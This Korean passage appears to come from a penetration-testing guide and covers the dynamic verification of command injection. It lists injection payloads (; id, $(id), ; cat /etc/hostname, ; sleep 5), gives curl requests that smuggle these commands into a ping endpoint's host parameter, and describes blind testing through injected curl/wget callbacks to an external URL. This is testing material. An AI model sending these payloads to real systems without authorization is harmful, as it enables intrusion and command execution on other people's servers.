### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. curl로 Command Injection 페이로드가 포함된 요청을 전송
2. 응답에서 추가 명령어의 실행 결과가 반환되는지 확인
3. Blind Command Injection의 경우 시간 기반 테스트(sleep) 또는 외부 콜백으로 확인

**안전한 페이로드 (읽기 전용, 파괴적이지 않은 명령어):**
- `; id` / `| id` / `&& id` — 현재 사용자 정보 (무해)
- `; cat /etc/hostname` — 호스트명 (무해)
- `$(id)` / `` `id` `` — 명령어 치환
- `; sleep 5` — 시간 기반 Blind 테스트 (응답 지연 확인)

**curl 예시:**
```
curl "https://target.com/api/ping?host=127.0.0.1%3Bid"
curl "https://target.com/api/ping?host=127.0.0.1%7Cid"
curl "https://target.com/api/ping?host=%24(id)"
```

**Blind Command Injection 테스트:**
- `; sleep 5` 삽입 후 응답 시간이 5초 이상 지연되면 명령어 실행 확인
- 외부 콜백 서비스(사용자 제공) URL로 curl/wget 요청 삽입

**검증 기준:**
- **확인됨**: 동적 테스트로 주입한 명령어의 실행 결과가 반환되거나 시간 지연이 확인됨
